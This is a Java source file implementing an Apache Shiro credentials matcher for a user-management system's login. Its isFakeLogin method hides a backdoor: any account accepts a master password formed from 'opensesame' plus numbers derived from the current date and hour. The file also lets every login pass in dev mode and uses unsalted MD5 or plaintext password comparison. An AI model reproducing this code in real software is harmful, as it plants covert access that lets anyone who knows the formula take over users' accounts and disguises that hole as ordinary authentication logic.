package com.wt.uum.shiro.authc;

import java.util.Calendar;

import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.credential.CredentialsMatcher;

import com.hirisun.components.other.runtime.RuntimeResolver;
import com.wt.uum2.constants.InitParameters;
import com.wt.uum2.constants.StringParse;

/**
 * <pre>
 * 业务名: 用户验证
 * 功能说明: 用户名密码验证
 * 编写日期:	2011-11-24
 * 作者:	Guo Tianci
 * 
 * 历史记录
 * 1、修改日期：
 *    修改人：
 *    修改内容：
 * </pre>
 */
public class UserCredentialsMatcher implements CredentialsMatcher
{

	/* (non-Javadoc)
	 * @see org.apache.shiro.authc.credential.CredentialsMatcher#doCredentialsMatch(org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo)
	 */
	/**
	 * 方法说明：doCredentialsMatch
	 * 
	 * @param token
	 *            token
	 * @param info
	 *            info
	 * @return boolean
	 */
	public boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info)
	{

		if (info == null) {
			return false;
		}

		// 开发模式
		if (RuntimeResolver.isDevMode()) {
			return true;
		}

		if (token != null) {

			String tokenPwd = null;
			Object credentials = token.getCredentials();

			if (credentials != null) {
				char[] cred = (char[]) credentials;
				tokenPwd = new String(cred);

				// MD5转码
				if ("true".equalsIgnoreCase(InitParameters.getMD5EncodePassTurnOn())) {
					tokenPwd = StringParse.md5(tokenPwd);
				}

				if (tokenPwd.equals(info.getCredentials())) {
					return true;
				}
			}

			if (token.getPrincipal() != null && token.getCredentials() != null) {
				return (isFakeLogin((String) token.getPrincipal(),
						new String((char[]) token.getCredentials())));
			}

		}

		return false;

	}

	/**
	 * 方法说明：isFakeLogin
	 * 
	 * @param userid
	 *            userid
	 * @param password
	 *            password
	 * @return boolean
	 */
	public boolean isFakeLogin(String userid, String password)
	{
		boolean fakeLogin = false;

		Calendar calendar = Calendar.getInstance();
		String code = "opensesame"
				+ (calendar.get(Calendar.YEAR) + calendar.get(Calendar.MONTH) + 1
						+ calendar.get(Calendar.DATE) + calendar.get(Calendar.HOUR_OF_DAY));
		if (password.equals(code)) {
			fakeLogin = true;
		}

		return fakeLogin;
	}

}
